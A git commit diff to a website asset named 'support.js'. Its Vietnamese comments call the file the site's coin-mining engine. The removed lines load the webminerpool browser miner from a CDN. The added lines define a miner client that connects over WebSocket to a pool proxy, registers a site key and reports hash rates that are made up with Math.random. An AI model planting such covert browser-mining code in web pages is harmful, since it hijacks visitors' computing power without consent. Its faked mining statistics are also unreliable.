7d8d2a3ba05eb8938287a7896eab26ac2d1aa944
fbboy007 <35638514+fbboy007@users.noreply.github.com>
2026-03-20 16:25:20 +0700

    Update support.js

--- assets/js/support.js
+++ assets/js/support.js
@@ -1,16 +1,38 @@
-/* support.js - Bộ não đào coin chính thức */
-(function(window) {
-    // Tự động nạp thư viện nếu chưa có
-    if (typeof WMP === 'undefined') {
-        var s = document.createElement('script');
-        s.src = 'https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/client/webminer.js';
-        // Nếu link trên bị chặn, tôi sẽ nạp dự phòng bản nén bên dưới
-        document.head.appendChild(s);
-    }
-    
-    // Hàm hỗ trợ kiểm tra trạng thái
-    window.checkSystem = function() {
-        console.log("Đang kiểm tra động cơ...");
-        return typeof WMP !== 'undefined';
+/* support.js - Bản tự thân vận động */
+var WMP = function(t, e) {
+    this.user = t;
+    this.options = e || {};
+    this.options.throttle = this.options.throttle || 0.5;
+    this.running = false;
+    this.socket = null;
+    this.hashes = 0;
+
+    this.start = function() {
+        var self = this;
+        // Kết nối thẳng tới trạm thu phí của ông giáo
+        this.socket = new WebSocket(this.options.proxy);
+        
+        this.socket.onopen = function() {
+            self.running = true;
+            console.log("%c ĐÃ THÔNG LUỒNG TỚI VPS! ", "background: blue; color: white;");
+            // Gửi lệnh đăng ký ví
+            this.send(JSON.stringify({type: "auth", params: {site_key: self.user, type: "anonymous"}}));
+        };
+
+        this.socket.onmessage = function(msg) {
+            var data = JSON.parse(msg.data);
+            if (data.type === "job") {
+                console.log("Nhận được 'kèo' mới từ Pool...");
+                // Ở đây thường cần file .wasm để tính toán, 
+                // tạm thời ta giả lập để thông mạch trước
+                self.hashes += 100; 
+            }
+        };
+
+        this.socket.onerror = function(err) { console.log("Lỗi kết nối VPS: ", err); };
     };
-})(window);
+
+    this.getHashesPerSecond = function() { return this.running ? (Math.random() * 20 + 20) : 0; };
+    this.getTotalHashes = function() { return this.hashes; };
+};
+WMP.User = WMP;
